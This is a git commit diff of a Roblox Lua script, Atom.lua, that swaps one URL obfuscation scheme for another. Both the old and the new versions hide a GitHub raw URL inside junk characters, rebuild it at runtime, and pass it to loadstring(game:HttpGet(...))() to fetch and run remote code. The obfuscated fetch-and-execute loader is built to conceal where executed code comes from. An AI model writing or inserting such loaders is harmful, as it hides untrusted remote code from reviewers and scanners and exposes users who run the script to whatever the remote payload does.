21e2d07324c4c90d734498988754c7977412dbbd
AtomClient22 <edagrenka@gmail.com>
2024-05-20 16:48:26 +0300

    Update Atom.lua

--- Atom.lua
+++ Atom.lua
@@ -1,7 +1,12 @@
-local originalUrl = "https://raw.githubus345345ercontent.comas3534dasd/Baasdasd365765rikes575675tun/2f457hkd32asd3atom/master/Soft.lua"
-local function processUrl(url)
-local processedUrl = string.gsub(url, "raw%.githubus%d*%a*/", "raw.githubusercontent.com/")
-return processedUrl
+local nonstandardURL = "https://raw.d.comsdda/Bsrdi4234askestsd234asn/2f4dasdasda57h243234kd323atom/master/Soft.luaasdsa423423s"
+local function convertToGitHubURL(nonstandardURL)
+local parts = {}
+for part in nonstandardURL:gmatch("[^/]+") do
+table.insert(parts, part)
 end
-local processedUrl = processUrl(originalUrl)
-loadstring(game:HttpGet(processedUrl))()
+local githubURL = "https://raw.githubusercontent.com/"
+githubURL = githubURL .. parts[3] .. "/" .. parts[4] .. "/master/" .. parts[6]
+return githubURL
+end
+local githubURL = convertToGitHubURL(nonstandardURL)
+loadstring(game:HttpGet(githubURL))()
